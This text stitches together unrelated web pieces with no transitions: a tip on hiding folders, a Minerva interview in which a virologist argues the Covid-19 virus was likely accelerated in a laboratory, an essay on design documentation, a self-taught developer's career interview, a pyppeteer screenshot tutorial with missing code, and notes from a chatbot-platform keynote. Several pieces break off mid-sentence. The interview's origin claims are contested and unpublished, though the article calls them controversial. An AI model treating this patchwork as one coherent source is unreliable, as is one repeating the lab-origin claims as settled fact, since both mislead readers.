<p>Thus, you can open your distributions default file manager in the location you are planning to hide a file. Right-click an empty spot and select New Folder. Name the folder starting with a period (i.e if you plan to name it <code>data</code>, you should type <code>.data</code>). </p>

            <h2>NYHET</h2>



        

        

            <h3 itemprop="description">
            The well-known Norwegian virologist Birger Sørensen and his colleagues have examined the corona virus. They believe it has certain properties which would not evolve naturally. These conclusions are politically controversial, but in this interview he shares the findings behind the headlines.
            </h3>

    

</div>


                <div><p>“I understand that this is controversial, but the public has a legitimate need to know, and it is important that it is possible to freely discuss alternate hypotheses on how the virus originated” Birger Sørensen starts to explain when Minerva visits him in his office one morning in Oslo.</p><p>Despite the explosiveness of his statements and research, Sørensen remains calm and collected.</p><p>Sørensen has been a point of controversy ever since former MI6 director Richard Dearlove cited a yet to be published article by Sørensen and his colleagues in an interview with The Daily Telegraph. The article claims that the virus that causes Covid-19 most likely has not emerged naturally.</p><p>“It’s a shame that there has already been so much talk about this, because I have yet to publish the article where I put forward my analysis”, Sørensen says in the form of an exasperated sigh.</p><p>Together with his colleagues, Angus Dalgleish and Andres Susrud have authored an article that looks into the most plausible explanations regarding the origins of the novel coronavirus. The article builds upon an already published article in the Quarterly Review of Biophysics that describes newly discovered properties in the virus spike protein. The authors are still in dialogue with scientific journals regarding an upcoming publication of the article.</p><p>News outlets are thus confronted with a difficult question: Are the findings and arguments Sørensen and his colleagues put forward of a sufficiently high quality to be presented and discussed in the public sphere? Sørensen explains that they in their dialogue with scientific journals are encountering a certain reluctance to publishing the article – without, however, proper scientific objections. Minerva has read a draft of the article, and has after an overall assessment decided that the findings and arguments do deserve public debate, and that this discussion cannot depend entirely on the publication process of scientific journals.</p><p>In this interview with Minerva, Sørensen therefore puts forward his hypothesis on why it is highly unlikely that the coronavirus emerged naturally.</p><p>On May 18th, WHO decided to conduct an inquiry into the coronavirus epidemic in China. Sørensen believes that it is important that this inquiry looks into new and alternate explanations for how the virus originated, beyond the already well-known suggestion that the virus originated in the Wuhan Seafood Market.</p><p>“There are very few who still believe that the epidemic started there, so as of today we have no good answers on how the epidemic started. Then we must also dare to look at more controversial, alternative explanations for the origin,” Sørensen says.</p><p>Birger Sørensen and one of his co-authors, Angus Dalgleish, are already known as HIV researchers par excellence.</p><p>In 2008, Sørensen’s work came to international <a href="https://www.dagensperspektiv.no/2008/norsk-firma-med-hiv-gjennombrudd">attention</a> when he launched a new immunotherapy for HIV. <a href="https://www.nature.com/search?author=%22Angus%20G.+Dalgleish%22">Angus Dalgleish</a> is the professor at St. George’s Medical School in London who became world famous in 1984 after having <a href="https://www.nature.com/articles/312763a0">discovered</a> a novel receptor that the HIV virus uses to enter human cells.</p><p>The purpose of the work Sørensen and his colleagues have done on the novel coronavirus, has been to produce a vaccine. And they have taken their experience in trialling HIV vaccines with them to analyse the coronavirus more thoroughly, in order to make a vaccine that can protect against Covid-19 without major side effects.</p><h2>Exceptionally well adjusted</h2><p>“The difference between our approach and other vaccine manufacturers is that we have a chemistry background, and we analyse the virus in detail as if we were making a drug,” Sørensen starts to explain.</p><p>“Biology is also chemistry, so by considering the virus from a chemistry perspective, we carry out more detailed analysis, zooming in on certain components.”</p><p>Sørensen takes us through the basic elements of their approach:</p><p>“The first thing you need to establish is which parts of the virus are changing, and which parts are stable. If you want to make a vaccine that lasts, you must stimulate the immune system to react against those parts of the virus that are constant, otherwise the effect will disappear and, in the worst-case scenario, lead to increased illness.</p><p>“Once we know this, we can try to make a vaccine. Where we differ is that we are trying to make a vaccine that uses elements that have as little in common with the body’s natural components as possible, so that the immune system is taught to recognise exactly what the vaccine should protect against”, Sørensen elaborates.</p><p>Sørensen believes this is an important insight which will prevent the immune system from being falsely stimulated in a way that could lead the vaccine to create too many dangerous side effects in the vaccinated person.</p><p>“When we have not succeeded in creating an HIV vaccine, despite the enormous efforts put into that endeavour for the past 30 years, it is because we haven’t understood this,” Sørensen continues.</p><p>He believes that there has not been enough interaction between the part of the pharmaceutical industry that makes HIV medicines and the part that runs the vaccine research. As a consequence, the knowledge you need to make a successful vaccine against HIV in the big pharmaceutical companies has not been adequately exploited by the big, international HIV preventing vaccine studies that have been carried out.”</p><p>Asked about what significance his approached has had when he has analyzed the coronavirus, Sørensen explains:</p><p>“We have examined which components of the virus are especially well suited to attach themselves to cells in humans. And we have done this by comparing the properties of the virus with human genetics. What we found was that this virus was exceptionally well adjusted to infect humans.”</p><p>He pauses for a second.</p><p>“So well that it was suspicious,” he adds.</p><h2>Perfected to infect humans</h2><p>It is already known that the novel coronavirus, like the virus that caused the SARS epidemic in Southeast Asia in 2002-2003, could attach itself to the ACE-2 receptors in the lower respiratory tract.</p><p>“But what we have discovered is that there are properties in this new virus which enables it to use an additional receptor, and create a binding to human cells in the upper respiratory tract and the intestines which is strong enough to produce an infection,” Sørensen elaborates.</p><p>Sørensen says that it is the use of this additional receptor that most likely results in a different illness in Covid-19 patients than the one resulting from SARS.</p><p>“This is what enables the virus to transmit to a greater degree between humans, without the virus having attached itself to the ACE-2 receptors in the lower respiratory tract, where it causes deep pneumonia.</p><p>“That is also why so many of the Covid-19 patients have mild symptoms at the start of the illness, and are contagious before they develop severe symptoms,” he adds.</p><p>It might also explain why some people are ‘super spreaders’ without being ill themselves, Sørensen says.</p><p>In the already published article Sørensen and his colleagues Angus Dalgleish and Andres Susrud describe what they claim is curious about the spike protein of the coronavirus, which makes it especially well suited to infect humans. These findings are the foundation for the hypothesis Sørensen and his colleagues develop in the new article, where they claim that the virus is not natural in origin.</p><div id="factbox-361864">
    <div>
        
        <h2>FACT BOX – Spike Protein</h2>
        <p>A spike protein is a part of the virus attached to the surface of the virus. The spike protein is used by the virus when it enters cells, enabling it to stick in humans. The properties of the spike determines which receptors a virus can utilise and thus which cells the virus can enter to create illness.</p>
        
    </div>
    
</div><p>“There are several factors that point towards this,” says Sørensen. “Firstly, this part of the virus is very stable; it mutates very little. That points to this virus as a fully developed, almost perfected virus for infecting humans.</p><p>“Secondly, this indicates that the structure of the virus cannot have evolved naturally. When we compare the novel coronavirus with the one that caused SARS, we see that there are altogether six inserts in this virus that stand out compared to other known SARS viruses,” he goes on explaining.</p><p>Sørensen says that several of these changes in the virus are unique, and that they do not exist in other known SARS coronaviruses.</p><p>“Four of these six changes have the property that they are suited to infect humans. This kind of aggregation of a type of property can be done simply in a laboratory, and helps to substantiate such an origin,” Sørensen points out.</p><h2>An artificially created virus</h2><p>Asked about whether this implies that the virus is not natural, Sørensen goes on to explain the laboratory process that leads to the creation of new viruses.</p><p>“In a sense it is natural. But the natural processes have most likely been accelerated in a laboratory,” he explains. “It’s also possible for a virus to attain these properties in nature, but it’s not likely. If the mutations had happened in nature, we would have most likely seen that the virus had attracted other properties through mutations, not just properties that help the virus to attach itself to human cells.”</p><p>Sørensen vividly explains this argument:</p><p>“Imagine that you have cultivated a billion coronaviruses you have gathered from nature, then you take this mass of viruses and inject them into a human cell culture from for example the upper respiratory tract. As a result, a few of these viruses will change in order to better attach themselves to …</p></div></section></article></div>

<p>Only loosely related to what it should do.</p>


<p>Code says what it does. That's important for the computer, because code is the way that we ask the computer to do something. It's OK for humans, as long as we never have to modify or debug the code. As soon as we do, we have a problem. Fundamentally, debugging is an exercise in changing what a program does to match what it should do. It requires us to know what a program should do, which isn't captured in the code. Sometimes that's easy: What it does is crash, what it should do is <em>not crash</em>. Outside those trivial cases, discovering intent is harder.</p>

<p>Debugging when <em>should do</em> is subtle, such as when building distributed systems protocols, is especially difficult. In our <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a> paper, we say:</p>

<blockquote><p>Our code reviews, simworld tests, and design meetings frequently referred back to the TLA+ models of our protocols to resolve ambiguities in Java code or written communication.</p></blockquote>

<p>The problem is that the implementation (in Physalia's case the Java code) is both an imperfect implementation of the protocol, and an overly-specific implementation of the protocol. It's overly-specific because it needs to be fully specified. Computers demand that, and no less, while the protocol itself has some leeway and wiggle room. It's also overly-specific because it has to address things like low-level performance concerns that the specification can't be bothered with.</p>

<p><em>Are those values in an ArrayList because order is actually important, or because O(1) random seeks are important, or some other reason? Was it just the easiest thing to write? What happens when I change it?</em></p>

<p>Business logic code, while lacking the cachet of distributed protocols, have even more of these kinds of problems. Code both over-specifies the business logic, and specifies it inaccurately. I was prompted to write this by a tweet from @mcclure111 where she hits the nail on the head:</p>

<blockquote data-conversation="none" data-dnt="true"><p lang="en" dir="ltr">Since most software doesn't have a formal spec, most software "is what it does", there's an incredible pressure to respect authorial intent when editing someone else's code. You don't know which quirks are load-bearing.</p>— mcc 🏳️‍⚧️🏳️‍🌈 (@mcclure111) <a href="https://twitter.com/mcclure111/status/1274422600236765186?ref_src=twsrc%5Etfw">June 20, 2020</a></blockquote>




<p>This is a major problem with code: <em>You don't know which quirks are load-bearing.</em> You may remember, or be able to guess, or be able to puzzle it out from first principles, or not care, but all of those things are slow and error-prone. What can we do about it?</p>

<p><strong>Design Documentation</strong></p>

<p>Documentation is uncool. Most software engineers seem to come out of school thinking that documentation is below them (<em>tech writer work</em>), or some weird thing their SE professor talked about that is as archaic as Fortran. Part of this is understandable. My own software engineering courses emphasized painstakingly documenting the implementation in UML. No other mention of documentation was made. Re-writing software in UML helps basically nobody. I finished my degree thinking that documentation was unnecessary busywork. Even the <a href="https://agilemanifesto.org/">Agile Manifesto</a> agreed with me<sup><a href="#foot1">1</a></sup>:</p>

<blockquote><p>Working software over comprehensive documentation</p></blockquote>

<p>What I discovered later was that design documentation, encoding the intent and decisions made during developing a system, helps teams be successful in the short term, and people be successful in the long term. Freed from fitting everything in my head, emboldened by the confidence that I could rediscover forgotten facts later, I could move faster. The same applies to teams.</p>

<p>One thing I see successful teams doing is documenting not only the <em>what</em> and <em>why</em> behind their designs, but the <em>how they decided</em>. When it comes time to make changes to the system—either for debugging or in response to changing requirements—these documents are invaluable. It's hard to decide whether its safe to change something, when you don't know why it's like that in the first place. The record of how you decided is important because you are a flawed human, and understanding how you came to a decision is useful to know when that decision seems strange, or surprising.</p>

<p>This documentation process doesn't have to be heavyweight. You don't have to draw painstaking <a href="https://en.wikipedia.org/wiki/Entity%E2%80%93relationship_model">ER diagrams</a> unless you think they are helpful. You should probably ignore UML entirely. Instead, describe the system in prose as clearly and succinctly as you can. One place to start is by building an RFC template for your team, potentially inspired by one that you find on the web. <a href="https://static1.squarespace.com/static/56ab961ecbced617ccd2461e/t/5d792e5a4dac4074658ce64b/1568222810968/Squarespace+RFC+Template.pdf">SquareSpace</a>'s template seems reasonable. Some designs will fit well into that RFC format, other's won't. Prefer narrative writing where you can.</p>

<p>Then, keep the documents. Store them somewhere safe. Soak them in vinegar <a href="https://www.almanac.com/content/home-remedies-cough-relief">and tie them around your chest</a>. You're going to want to make sure that the people who need to maintain the system can find them. As they are spelunking through history, help them feel more like a library visitor and less like Lara Croft.</p>

<p>I'm not advocating for Big Design Up Front. Many of the most important things we learn about a project we learn during the implementation. Some of the most important things we learn years after the implementation is complete. Design documentation isn't a static one-time ahead-of-time deliverable, but an ongoing process. Most importantly, design documentation is not a commitment to bad ideas. If it's wrong, fix it and move forward. Documentation is not a deal with the devil.</p>

<p><strong>Comments</strong></p>

<p>Few topics invite a programmer flame war like comments. We're told that comments are silly, or childish, or make it hard to show how manly you are in writing that convoluted mess of code. If it was hard to write, it should be hard to read. After all, you're the James Joyce of code.</p>

<p>That silliness aside, back to @mcclure111's thread:</p>

<blockquote data-conversation="none" data-dnt="true"><p lang="en" dir="ltr">This means comments that *reveal* authorial intent are valuable, and comments that reveal *there was no authorial intent* are even more valuable. Without those hints, you're left editing superstitiously, preserving quirks even when you don't know why. <a href="https://t.co/YhvWnXjp9i">https://t.co/YhvWnXjp9i</a></p>— mcc 🏳️‍⚧️🏳️‍🌈 (@mcclure111) <a href="https://twitter.com/mcclure111/status/1274422825831596039?ref_src=twsrc%5Etfw">June 20, 2020</a></blockquote>




<p>Comments allow us to encode <em>authorial intent</em> into our code in a way that programming languages don't always. Types, traits, interfaces, and variable names do put intent into code, but not completely (I see you, type system maximalists). These same things allow us to communicate a lack of intent—consider <a href="https://docs.oracle.com/javase/8/docs/api/java/util/RandomAccess.html">RandomAccess</a> vs <a href="https://docs.oracle.com/javase/8/docs/api/java/util/ArrayList.html">ArrayList</a>—but are also incomplete. Well-commented code should make the intent of the author clear, especially in cases where that intent is either lost in the translation to code, or where implementation constraints hide the intent of the design. Code comments that link back to design documents are especially useful.</p>

<p>Some languages need comments more than others. Some, like SQL, I find to nearly always obscure the intent of the design behind implementation details.</p>

<p><strong>Formal Specification</strong></p>

<p>In <a href="https://cacm.acm.org/magazines/2015/4/184705-who-builds-a-house-without-drawing-blueprints/fulltext">Who Builds a House Without Drawing Blueprints?</a> Leslie Lamport writes:</p>

<blockquote><p>The need for specifications follows from two observations. The first is that it is a good idea to think about what we are going to do before doing it, and as the cartoonist Guindon wrote: "Writing is nature's way of letting you know how sloppy your thinking is."</p>

<p>The second observation is that to write a good program, we need to think above the code level.</p></blockquote>

<p>I've found that specification, from informal specification with narrative writing to formal specification with TLA+, makes writing programs faster and helps reduce mistakes. As much as I like that article, I think Lamport misses a key part of the value of formal specification: it's a great communication tool. In developing some of the trickiest systems I've built, I've found that heavily-commented formal specifications are fantastically useful documentation. Specification languages are all about <em>intent</em>, and some make it easy to clearly separate intent from implementation.</p>

<p>Again, from our <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a> paper:</p>

<blockquote><p>We use TLA+ extensively at Amazon, and it proved exceptionally useful in the development of Physalia.  Our team used TLA+ in three ways: writing specifications of our protocols to check that we understand them deeply, model checking specifications against correctness and liveness properties using the TLC model checker, and writing extensively commented TLA+ code to serve as the documentation of our distributed protocols. While all three of these uses added value, TLA+’s role as a sort of automatically tested (via TLC),and extremely precise, format for protocol documentation was perhaps the most useful.</p></blockquote>

<p>Formal specifications make excellent documentation. Like design docs, they aren't immutable artifacts, but a reflection of what we have learned about the problem.</p>

<p><strong> Conclusion </strong></p>

<p>Building long-lasting, maintainable, systems requires not only communicating with computers, but also communicating in space with other people, and in time with our future selves. Communicating, recording, and indexing the intent behind our designs is an important part of that picture. Make time for it, or regret it later.</p>

                        <p>Mariano used to make $2,500 a year in Argentina 10 years ago. He now makes $210,000 as a self-taught developer working remotely. That's 84 * $2,500.</p><p>Mariano shares his story of learning to code for free, working his way out of poverty and getting lucrative remote jobs from Argentina. I've not been this excited about an article for a long time. Enjoy!</p><h2 id="hey-can-you-introduce-yourself">Hey, can you introduce yourself? </h2><p>Sure! My name is <a href="https://twitter.com/geekmz">Mariano Zorrilla</a>, I’m 31 years old and a Tech Lead at Venmo/PayPal. Before that I was a Head of Mobile at HighSide (a startup). I was raised in a small city called Rio Ceballos in Cordoba province in Argentina. The population is around 20,000 people. There are only medium to low income families. Every single store is locally owned (no retail stores, no big names, no chains, no fast food companies). </p><p>When I was a kid we had an income of around $400 dollars a month for the entire family (6 in total) and lots of debt. I went to a local elementary school and high school. Due to our family income, I couldn’t go to college. Even though it's free in my country I was living 30 miles (50km) away from any college. I couldn't afford paying the bus ticket every day.</p><h2 id="how-much-do-you-earn-roughly-as-a-software-engineer">How much do you earn roughly as a software engineer? </h2><p>Right now I make $210,000 a year. I always look into ways to increase and diversifying my income. Because I live in Argentina, I can have a good life spending around $2k dollars a month. Then I put all my money into savings accounts for future big investments.</p><h2 id="can-you-tell-us-about-the-economic-situation-in-argentina">Can you tell us about the economic situation in Argentina?</h2><p>In Argentina, the poverty rate was around 35% when I started coding and now sits at around 50% of the population. Only 40% of the active population is currently working. Apart from the private sector, the rest work for the public sector or don’t work at all. They have a small monthly income of $150 dollars a month from government benefits.</p><h2 id="why-did-you-learn-to-code">Why did you learn to code? </h2><p>All those things made me keep looking forward to becoming a mobile developer. I was lucky enough to have friend next door who was the only hardware engineer in the entire city. He at least had an idea of what “coding” was about. I chatted with him to start the process (and now I bring him to work with me at Venmo/PayPal).</p><p>I started working at the age of 14 helping my mom. My first bucks came when I was 17 years old responding to phone calls on a local FM Radio and TV Station 1 hour a day. After 3 months I got something like $45.</p><p>Getting better jobs was hard because the “best” ones were in the city close by. Paying for the bus was already taking a big part of my salary. So I managed to get work at a call center (Customer Phone Care). I earned around $200 to $250 a month so enough for me to travel, pay for food and that’s it. &nbsp;I stayed that way until I turned 20 years old and I was really depressed with no future ahead of me. </p><p>Every day I had 3 hours in total going to and back from work on a bus to “think” about things I could do to have a better income. By then, the iPhone was a thing and I had an old 2004 smartphone (Nokia). By then it was 2009 &nbsp;but I could run apps and I found that amazing! It was a pocket PC for me.</p><p>In one of those trips I read an article about Google doing a phone. People will be able to do apps! So, I got this crazy idea of doing apps. I didn’t even have a PC at home, but at least I got my first goal. &nbsp;Due to my low income, I couldn’t have a credit card, so I decided to buy a cheap netbook (those 7” to 10” &nbsp;laptops). </p><p>I split the laptop cost into six small payments as the whole cost was much as my whole month's salary. &nbsp;That small machine allowed me to download Eclipse and Photoshop. So I could start learning every time I had free time out of work. The journey to learn how to code started there aged 21. Again, I was saving to get my first Android device (the Motorola Milestone/Droid).</p><!--kg-card-begin: markdown--><p><a href="https://gum.co/XUBNd"><img src="https://www.nocsdegree.com/content/images/2020/06/imposter-syndrome-with-image-collage-2--1-.jpg" alt="imposter-syndrome-with-image-collage-2--1-"></a></p>
<!--kg-card-end: markdown--><h2 id="how-did-you-learn-to-code-without-a-cs-degree">How did you learn to code without a CS degree? </h2><p>I got a JAVA SE 6 book (2.300 pages) which I didn’t understand even a bit of the first time… and the same for my second time. I tried to follow a course about Android for 3 months that I also didn’t understand much. But I kept in contact with the teacher to “code professionally”. I tried to work with him for a few months but I couldn’t pay for my bus ticket and stopped doing it. </p><p>I spent almost a year unemployed doing some coding at home. I was testing what I was doing wrong but I get so frustrated and sometimes depressed. I managed to make a small FM Radio app getting the URL of a local station from their website. The owners talked with me to make it “look good” and that allowed me to improve my code. </p><p>During all that time and year I tried to do job interviews. I got so many non stop “Nos” from everyone because I didn’t have a CS Degree and didn’t have any industry experience. I spent 3 months doing a super simple app with little functionality. But I learned all the process of posting the app over the Android Market (yep, the old name of the Play Store). I didn’t get any money from that, but I started getting my name around the city and ended up trying to get clients.</p><p>After a couple of months of unemployment I got back to a call center to get a bit of money to pay the bills. This time I spent all my free time coding anything I could think of. I was watching blog post tutorials and understanding MCV and MVP architecture. Plus, learning Java from top to bottom. </p><p>I quit after a year and managed to get a client who needed Android, iOS and a website. I knew nothing about iOS and websites, but I took the challenge. I asked him if he could lend me his Mac Mini to code in iOS as I needed Xcode to run that. &nbsp;I saved up to get a cheap iPod Touch to test the app.</p><p>I searched on every blog possible how to parse JSON, how to do API connections and play audio. I ended up with a basic app in 2 weeks. In that time I also re-did the first app that originally took me 3 months in 2 days. I used all the knowledge I got after 1 year &nbsp;of non-stop practicing and practicing. </p><p>For websites I learned PHP, MySQL, some DevOps skills and AWS. I got a WordPress website running with a basic endpoint to fetch news. I also did some freelance work to get a few extra dollars, but I mostly did UI/UX for mobile apps.</p><h2 id="moving-to-buenos-aires">Moving to Buenos Aires</h2><p>That client lasted for 8 months. When the money was running out, I saw an Android job opportunity on Twitter and decided to give it a try. It was 400 miles (650km) away from where I was; from a small city to the biggest in the entire country, Buenos Aires. It was a mobile game company. Because I love to do animations, I demonstrated this to them, got hired and moved to Buenos Aires. &nbsp;I made a $12k annual salary which sounded incredible for me at the time.</p><p>I learned a lot about how to use Git, different mobile architectures, working with a large team and making a large project with millions of users. Like before, I spent all my free time learning new coding skills but now with a much larger scope. (mostly from blogs, youtube videos and github open source projects.) Then, thanks to my English skills I managed to get jobs from the United States.</p><h3 id="prepare-for-technical-interviews-with-algo-expert-nocs-gets-you-15-off-">Prepare for technical interviews with <a href="https://www.algoexpert.io/nocs">Algo Expert</a>- "NOCS" gets you 15% off. </h3><h2 id="getting-remote-jobs-as-a-developer">Getting remote jobs as a developer</h2><p>I first landed at a young startup which was a terrible experience but I get to know San Francisco for a month. That was my dream since I started watching all the events and companies being over there). Then I moved to some remote software factories for a while making $24k a year. Then, I became a senior contractor developer for a huge mobile game company in San Francisco. This increased my income to $40k a year.</p><p>My last two &nbsp;jobs were also remote: I was Head of Mobile for a NYC Startup company where I fixed their native client apps. I managed to talk with the CEO and CTO to check technologies and use Flutter to have 1 code base. I was still in Argentina while making $60k a year in that position. I lasted 1 year there with so many challenges. I was learning complex algorithms and scaling a huge chat app. </p><p>Then I got a phone call from my previous contractor about a huge opportunity. It was at Venmo/PayPal making $160k a year as a Tech Lead. That was thanks to all the management level knowledge I got from previous jobs. I was not only involved with the code, but the product itself. Plus, I have extra consultant/freelance work for another $50k a year.</p><h2 id="what-advice-do-you-have-for-someone-without-a-cs-degree-who-wants-to-get-their-first-programming-job">What advice do you have for someone without a CS degree who wants to get their first programming job? </h2><p>Don’t work hard (too hard), work smart! You could learn many things that took me around 5 years in way less time. Because I wasn't looking for the right/correct information. </p><p>Learn about good practices, solid OOP knowledge and clean architecture. Use social media, github and online platforms like codepen to showcase your work. &nbsp;Make a portfolio and involve yourself in your local development community. Do a LOT of networking and gain the trust of your peers. </p><p>You’ll eventually become a Sr developer, but that takes years no matter what you do. So do it in a smart way to get the best opportunities for your future.</p><!--kg-card-begin: markdown--><p><a href="http://nocsok.com/"><img src="https://www.nocsdegree.com/content/images/2020/06/No-CS-OK-screenshot-1.jpg" alt="No-CS-OK-screenshot-1"></a></p>
<!--kg-card-end: markdown--><h2 id="what-are-some-tips-for-getting-remote-freelance-contracts">What are some tips for getting remote freelance contracts? </h2><p>Again, make yourself known around the community. Get a good portfolio of examples. Showcase your “developer powers” by doing something out of the ordinary. Participate in hackathons and go to Meetups events. Eventually, with a good network and people knowing your hard work, dedication and code quality, those opportunities show up!</p><h2 id="what-tips-do-you-have-for-people-wanting-to-code">What tips do you have for people wanting to code? &nbsp;</h2><p>It’s a challenge, it is not easy. So don’t worry if you don’t know lots of math. You can spend a career without knowing complex algorithms. Is going to be frustrating many &nbsp;times but don’t take that in a bad way. It is a normal process for learning how to code. Take &nbsp;a “video game” perspective: That complex UI with API calls and lists of items are the main Enemy. Your code editor and brain are your weapons. Once you defeat the Enemy …</p></div></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="mainContentOfPage">
		
<p><a href="https://pypi.org/project/pyppeteer/">pyppeteer</a> is a Python port of a headless Chromium browser automation library <a href="https://github.com/puppeteer/puppeteer">puppeteer</a>. It is a very useful tool in general and can be used to perform a number of tasks like web scraping, automation and making website screenshots! The advantage of using an actual browser to create website screenshots is clear: it gives us the very same result people will see in their own browsers.</p>



<p>Once the screenshot is taken, we will use Python imagining library <a href="https://pillow.readthedocs.io/en/stable/">Pillow</a> to resize the resulting image to the size we want. We can call our code in number of ways, but for this example I will use CLI library <a href="https://click.palletsprojects.com/en/7.x/">Click</a>. You can learn more about Click in my other blog post <a href="https://stribny.name/blog/2020/01/building-command-line-interfaces-in-python">Building command-line interfaces in Python</a>.</p>



<p>So let’s begin by installing our dependencies:</p>



<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

						<td><div><p>pip install pyppeteer</p><p>pip install pillow</p><p>pip install click</p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->




<p>Pyppeteer will also need a working copy of Chromium, which can be downloaded directly by invoking <code>pyppeteer-install</code> command which will become available after installation.</p>



<p>Once this is done, we can start creating our program. The main code will  start a headless Chromium, navigate to a page we want to capture and save its screenshot to a file of our choosing. The interesting thing is that pyppeteer has asynchronous API, so we will define our function also as asynchronous and later on use Python’s AsyncIO event loop to run it:</p>



<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f034e8751e9f354148103" data-settings=" no-popup minimize scroll-mouseover">

<p>The code is very straightforward due to the pyppeteer’s simple API. The important decision here is that we want to be able to provide browser’s viewport dimensions. Unless set to a proper screen size, Chromium would start with a very small window and the screenshot would be useless.</p>



<p>After the screenshot is saved, we want to resize it to a size for publishing, so for that let’s implement a resize_screenshot function:</p>



<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f034e8751ea2732693634" data-settings=" no-popup minimize scroll-mouseover">
		
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>def </span><span>resize_screenshot</span><span>(</span><span>original_path</span><span>:</span><span> </span><span>Path</span><span>,</span><span> </span><span>resized_path</span><span>:</span><span> </span><span>Path</span><span>,</span><span> </span><span>width</span><span>:</span><span> </span><span>int</span><span>,</span><span> </span><span>height</span><span>:</span><span> </span><span>int</span><span>)</span><span> </span><span>-&gt;</span><span> </span><span>None</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>im</span><span> </span><span>=</span><span> </span><span>Image</span><span>.</span><span>open</span><span>(</span><span>original_path</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>im</span><span>.</span><span>thumbnail</span><span>(</span><span>(</span><span>width</span><span>,</span><span> </span><span>height</span><span>)</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>im</span><span>.</span><span>save</span><span>(</span><span>resized_path</span><span>)</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->




<p>To tie it all together, we will use Click to implement a command. This command will allow us to change all of the parameters we need: the URL, viewport size, final screenshot size and the filenames used for saving the images:</p>

<p>As our capture_screenshot function is async, we had to create AsyncIO event loop to invoke it. You can see the whole working example including the imports in my <a href="https://github.com/stribny/python-screenshots/blob/master/main.py">python-screenshots</a> repository.</p>



<p>To run the program, simply invoke our screenshot command:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<p>As part of the <a href="http://botse.org/" target="_blank" rel="noopener noreferrer">2nd International Workshop on Bots in Software Engineering</a> (BotSE 2020), I gave the keynote <a href="https://www.slideshare.net/jcabot/lessons-learned-from-building-a-commercial-bot-development-platform" target="_blank" rel="noopener noreferrer">“Lessons learned from building a commercial bot development platform”</a> where I discussed some of the key aspects we have learned while building our opensource and <a href="https://modeling-languages.com/low-code-platforms-smart-apps-ai/" target="_blank" rel="noopener noreferrer">low-code</a> chatbot development platform <a href="https://xatkit.com/" target="_blank" rel="noopener noreferrer">Xatkit</a>&nbsp; (see also the <a href="https://github.com/xatkit-bot-platform" target="_blank" rel="noopener noreferrer">Xatkit organization in GitHub</a>)</p>
<p>After an introductory <a href="https://xatkit.com/chatbot-videos-presentations-xatkit/" target="_blank" rel="noopener noreferrer">mini-tutorial on Xatkit</a> and explaining why the world needs yet another bot solution, I moved to discuss the struggles we are facing when trying to move Xatkit from a research prototype to a commercial-grade tool. Some of the challenges are common to any<a href="https://jordicabot.com/industrialization-of-research-tools-the-atl-case/" target="_blank" rel="noopener noreferrer"> industrialization effort</a> (when you’re at the same time the research team and the technology provider in charge of maturing the tool) and shared as well with any other core open source project fighting for its <a href="https://sustainoss.org/" target="_blank" rel="noopener noreferrer">long-term sustainability</a> (a topic on which, btw, <a href="https://livablesoftware.com/bots-open-source-sustainability/" target="_blank" rel="noopener noreferrer">bots can also play a key role</a>).</p>
<p>You can check the slides of my talk below but let me also highlight some of our key lessons learned in building a chatbot platform for you, ranging from organizational, technical, and business challenges:</p>
<ul>
<li><strong>Organizational challenges</strong>
<ul>
<li><strong>You need to be a Polymath to create a bot platform</strong>. Plenty of core bot tech: NLU, Sentiment Analysis, Xtext, Slack/GH/… APIs,…., but even more non-bot tech: InfluxDB, Nginx, eCharts, React, web sockets, Docker… that you’ll need to master when building a bot platform.</li>
<li>Commercial-grade quality involves<strong> spending more and more time on “boring” tasks</strong> as you need to polish all aspects of the tool (interface, docs,…) that you can easily skip when just building a prototype.</li>
<li><strong>Common challenges to any OSS project</strong> like attracting contributors, giving support to <a href="https://livablesoftware.com/5-ways-to-thank-open-source-maintainers/" target="_blank" rel="noopener noreferrer">users that don’t even say thank you</a> or the cost of maintaining external contributions (e.g. connectors) especially when the core is still evolving</li>
<li><strong>Being pragmatic.</strong> Make sure everything you do has a good Return of Investment. Example: we went from having official releases, to core releases to no releases (compile from sources). Also, we don’t support older versions and don’t keep backward compatibility. These are all things that would be nice to have but that we cannot afford.</li>
</ul>
</li>
<li><strong>Technical challenges</strong>
<ul>
<li><strong>Eat your own chatbot food</strong> for a better language. Evolving your DSLs is expensive, try to design a variety of bots to make sure your language is expressive enough for your needs (e.g. when we moved to our current <a href="https://xatkit.com/chatbot-dsl-state-machines-xatkit-language/" target="_blank" rel="noopener noreferrer">state-machine language semantics</a>, we had to reimplement the editor, the examples, the docs,…</li>
<li><strong>Combine textual and graphical notations</strong>. Textual for writing + <a href="https://xatkit.com/graphical-rendering-of-your-chatbot-models/" target="_blank" rel="noopener noreferrer">Graphical for Reading</a></li>
<li>Do not reinvent the wheel. <strong>We came close to reinvent Java!</strong> (and moved to <a href="https://www.eclipse.org/Xtext/documentation/305_xbase.html#xbase-language-ref-introduction" target="_blank" rel="noopener noreferrer">Xbase</a>)</li>
<li>Think long-term. <strong>Research prototypes are pure technical debt</strong></li>
<li>Security. <strong>Are you protected against DDoS attacks via a bot?. </strong>It’s not only a security concern but also an economical one if you’re paying to an external provider (e.g. DialogFlow) to process your input texts. There are also privacy concerns if you keep the session data for further <a href="https://xatkit.com/dashboard-monitoring-chatbot/" target="_blank" rel="noopener noreferrer">bot monitoring and analysis</a>.</li>
</ul>
</li>
<li><strong>Natural Language Processing</strong>
<ul>
<li>NLP engines don’t speak Catalan. Once you’re out of the mainstream languages (English, Spanish, French,….) you may need to combine several NLP engines to cover well the languages you’re interested in.</li>
